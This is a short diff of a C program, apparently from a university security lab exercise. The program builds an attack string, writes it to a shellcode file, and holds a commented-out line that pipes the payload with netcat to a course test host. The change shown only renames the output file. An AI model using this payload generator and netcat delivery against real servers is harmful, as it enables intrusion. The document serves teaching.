@@ -26,7 +26,7 @@ int main(int argc, char** argv) {
     //strcat(attack_string," HTTP | nc 310test.cs.duke.edu 9289");
     
     printf("%s\n", attack_string);
-    fp = fopen("shellcode.dat", "w");
+    fp = fopen("shellcode.txt", "w");
     fprintf(fp, "%s", attack_string);
 }
    
